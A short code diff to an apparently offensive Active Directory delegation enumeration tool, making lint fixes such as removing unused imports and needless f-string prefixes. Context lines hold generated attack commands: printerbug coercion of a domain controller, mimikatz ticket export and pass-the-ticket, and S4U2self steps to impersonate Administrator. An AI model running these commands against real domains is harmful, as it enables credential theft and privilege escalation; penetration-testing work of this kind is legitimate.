@@ -11,9 +11,8 @@ delegation trusts.
 
 from __future__ import annotations
 
-import re
 from dataclasses import dataclass, field
-from typing import Any, Optional
+from typing import Any
 
 DELEGATION_FLAGS = {
     "WORKSTATION_TRUST_ACCOUNT": 0x1000,
@@ -241,8 +240,8 @@ class DelegationEnumerator:
                 ],
                 exploitation_commands=[
                     f"python3 printerbug.py {self.domain}/attacker@{target.sam_account_name} TARGET_DC",
-                    f"mimikatz.exe \"sekurlsa::tickets /export\"",
-                    f"mimikatz.exe \"kerberos::ptt ADMINISTRATOR.kirbi\"",
+                    "mimikatz.exe \"sekurlsa::tickets /export\"",
+                    "mimikatz.exe \"kerberos::ptt ADMINISTRATOR.kirbi\"",
                 ],
             )
             self.attack_paths.append(path)
@@ -258,7 +257,7 @@ class DelegationEnumerator:
                     attack_steps=[
                         f"1. Obtain NTLM hash of {target.sam_account_name}",
                         f"2. Request S4U2self TGS for Administrator to {delegate_to}",
-                        f"3. Inject the resulting service ticket (PTT)",
+                        "3. Inject the resulting service ticket (PTT)",
                         f"4. Access {delegate_to} as Administrator",
                     ],
                     exploitation_commands=[
